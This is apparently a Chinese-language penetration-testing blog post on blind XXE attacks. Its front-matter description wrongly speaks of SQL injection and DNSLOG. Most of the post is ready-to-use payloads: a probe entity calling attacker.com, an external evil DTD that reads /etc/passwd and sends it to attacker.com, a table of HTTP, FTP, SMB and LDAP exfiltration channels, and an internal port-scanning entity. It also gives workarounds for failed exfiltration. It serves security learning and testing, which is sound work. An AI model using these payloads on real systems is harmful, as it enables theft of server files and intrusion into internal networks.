---
title: XXE：盲 XXE 与外带数据
date: 2025-10-12 15:59:48
tags:
  - Web安全
  - 渗透测试
description: SQL 注入 OOB 外带——DNSLOG 原理、ceye.io 使用与各数据库外带通道。
categories: 渗透测试
---

## 盲 XXE 判断

页面不返回实体内容时，用外带（OOB）判断：

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/xxe_test">
]>
<root>&xxe;</root>
```

攻击者服务器收到 HTTP 请求 → 存在 XXE。

---

## 参数实体 + DTD 级联

**核心技巧：** 参数实体只能在 DTD 内部使用，通过外部 DTD 级联实现数据外带。

**第一步：上传恶意 DTD（攻击者服务器）**

```
# http://attacker.com/evil.dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

**第二步：XML 中引用外部 DTD**

```xml
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>test</root>
```

攻击者服务器收到 `GET /?data=root:x:0:0:root...` → 数据外带成功。

---

## 各协议外带通道

| 协议 | Payload | 适用场景 |
|------|---------|---------|
| HTTP | `http://attacker.com/?d=%file;` | 最通用 |
| FTP | `ftp://attacker.com/%file;` | HTTP 被禁时 |
| SMB | `\\attacker.com\share\%file;` | Windows 目标 |
| LDAP | `ldap://attacker.com/%file;` | Java 环境 |

---

## 端口探测（盲 XXE）

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:22">
]>
<!-- 超时 vs 连接拒绝 → 端口状态判断 -->
```

响应时间差异可判断内网端口开放情况。

---

## 踩坑记录

1. **参数实体在内部 DTD 不能用** → 必须引外部 DTD
2. **数据含换行/特殊字符导致 HTTP 请求失败** → Base64 编码后外带或仅取第一行
3. **Java 环境下 file:// 不解析 `/`** → 用 `netdoc` 或 `jar://` 协议替代
4. **PHP expect:// 需要 PHP 安装 expect 扩展** → 生产环境极少安装

---

> 本文仅用于授权安全测试与学习，请勿用于非法用途。
